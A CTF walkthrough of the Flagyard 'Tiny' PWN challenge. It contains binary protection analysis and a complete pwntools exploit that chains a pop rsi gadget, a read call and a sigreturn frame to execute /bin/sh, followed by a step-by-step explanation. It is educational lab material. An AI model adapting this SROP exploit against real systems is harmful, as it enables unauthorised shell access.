---
title: "Flagyard - Tiny"
excerpt: " "
comments: true
categories:
  - Hacking
  - Walkthrough
  - CTF
tags:
  - Hacking
  - Walkthrough
  - CTF
  - Flagyard
header:
  overlay_image: /assets/images/pasek-hack.png
---
# Forens/Torrent Tempest
{: .text-justify}

## 00. Metainfo

|:----|:----|
|Portal:|[Flagyard](https://flagyard.com/)|
|Task:|[Tiny](https://flagyard.com/labs/training-labs/13/challenges/3f614fb4-65b8-48a3-894a-3e918a6d182d)|
|Category:|PWN|

# 01. Description
## Introduction
This task comes from the challenge platform **flagyard.com** and is marked as **easy**. However, the solution requires creative techniques and in-depth knowledge of exploitation concepts. While the binary is small and lacks traditional protections, the limited set of gadgets and syscall handling makes this challenge more intricate than it initially appears.
{: .text-justify}

## Binary Information

### **Checksec Results**
```plaintext
   Arch:       amd64-64-little
   RELRO:      No RELRO
   Stack:      No canary found
   NX:         NX unknown - GNU_STACK missing
   PIE:        No PIE (0x400000)
   Stack:      Executable
   RWX:        Has RWX segments
   Stripped:   No
```

### **LDD Results**
```plaintext
ldd ./tiny
        not a dynamic executable
```

### **Analysis**
- **No external libraries:** The binary is not dynamically linked; it does not use external shared libraries.
- **Built-in functions:** The binary contains internal implementations of `read`, `write`, and a `gadget` symbol. This indicates custom syscall handling.
- **No stack protections:** The binary lacks stack canaries, RELRO, and NX, making exploitation theoretically easier.
- **One useful gadget:** The only usable gadget is `pop rsi; ret`, significantly limiting the available ROP chain options.

---

## Time Spent on the Exploit
I spent several hours working on this solution. Despite the binary being named "tiny," it was far from simple. The challenge does not involve traditional buffer overflow vulnerabilities. Instead, you construct ROP chains directly while supplying data to the binary.
{: .text-justify}
Due to the lack of useful gadgets (with only `pop rsi` being helpful), the exploit heavily relies on `sigreturn` to gain full control over the registers. Crafting the right approach to manipulate syscalls and use a minimal set of gadgets required significant effort and debugging.
{: .text-justify}
---
## Solve in Python
```python
from pwn import *  # Include pwntools library

# Set up context for the exploit
context.update(arch='x86_64', os='linux')  # Set architecture and OS for pwntools
context.terminal = ['wt.exe', 'wsl.exe']   # Use Windows Terminal with WSL

# Load the binary
binary = context.binary = ELF("./tiny", checksec=False)

# Determine whether to connect locally or remotely
if args.REMOTE:
    p = remote('nc 34.252.33.37 32435'.split()[1], 32435)  # Remote connection
else:
    p = process(binary.path)  # Local process

# Gadgets and addresses
pop_rsi = binary.sym["gadget"]          # Resolve the symbol for the pop_rsi gadget
bss = 0x0000000000402008                # Address of the writable .bss section
read = 0x000000000040103c               # Modified read function to ignore unnecessary registers
syscall = 0x000000000040102d            # syscall gadget with ret

# Prepare the SigreturnFrame for sigreturn-oriented programming (SROP)
frame = SigreturnFrame(kernel="amd64")
frame.rax = 0x3b            # Set rax to 59 for execve
frame.rdi = bss             # Set rdi to point to /bin/sh in .bss
frame.rsi = 0x0             # Set rsi to NULL (argv)
frame.rdx = 0x0             # Set rdx to NULL (envp)
frame.rip = syscall         # Set rip to the syscall gadget

# Build the ROP payload
# - Load the .bss address into rsi using pop_rsi
# - Call the read function to write "/bin/sh" into .bss
# - Prepare the sigreturn frame to set registers for execve
payload = (
    p64(pop_rsi) + p64(bss) + p64(read) +  # Load bss into rsi for the read syscall
    p64(syscall) + bytes(frame)           # Trigger the sigreturn syscall with the frame
)

p.sendafter(b"rop me:", payload)          # Send the payload
                                          # Includes:
                                          # - Loading bss into rsi
                                          # - Calling read to populate bss with "/bin/sh"
                                          # - Preparing the sigreturn frame to set registers

p.send(b"/bin/sh" + b"\x00" * 8)          # Send "/bin/sh" to bss and ensure rax = 15 for sigreturn
                                          # Creates the string "/bin/sh" and prepares for execve

p.interactive()                           # Switch to interactive mode to access the shell
```
## Explanation of How the Exploit Works

### **Binary Setup**
The binary lacks standard protections, which makes it theoretically exploitable. However, it compensates for this with very limited gadgets and built-in syscall handling, requiring a creative approach using Sigreturn-Oriented Programming (SROP).
{: .text-justify}
### **Step-by-Step Explanation**

1. **Dynamic Resolution of Gadgets:**
   - The `pop rsi` gadget is dynamically resolved using `binary.sym["gadget"]`. This makes the exploit more robust to changes in the binary.

2. **Writable Memory Section:**
   - The `.bss` section (address `0x402008`) is used as a writable location to store the `/bin/sh` string.

3. **Crafting the Payload:**
   - The payload is built to:
     1. Load the `.bss` address into the `rsi` register using the `pop rsi` gadget.
     2. Call the `read` function to write `/bin/sh` into `.bss`.
     3. Set up a `SigreturnFrame` to configure the registers for the `execve` syscall.

4. **Triggering the Sigreturn:**
   - After sending `/bin/sh` to the binary, the `read` syscall completes and sets `rax = 15` (number of bytes read), triggering the `sigreturn` syscall.
   - The `sigreturn` syscall uses the `SigreturnFrame` to set all necessary registers:
     - `rax = 59`: Syscall number for `execve`.
     - `rdi = 0x402008`: Address of `/bin/sh` in `.bss`.
     - `rsi = 0` and `rdx = 0`: NULL pointers for arguments and environment variables.
     - `rip = syscall`: Address of the syscall gadget.

5. **Executing the `execve` Syscall:**
   - The `execve` syscall executes successfully, launching an interactive shell.

### **Key Takeaways**
- This exploit demonstrates the power of SROP in a minimalistic binary with limited gadgets.
- By using the `sigreturn` syscall, full control over all registers is achieved, bypassing the limitations imposed by the binary's design.
- Despite its simplicity in appearance, this binary requires an advanced understanding of syscall behavior and ROP chains to exploit effectively.

## Summary
This was an interesting challenge. It taught me a new technique, patience, and the importance of not giving up. Despite its minimalistic design, the task required a deep understanding of system calls and exploitation strategies, making it a rewarding learning experience.
{: .text-justify}


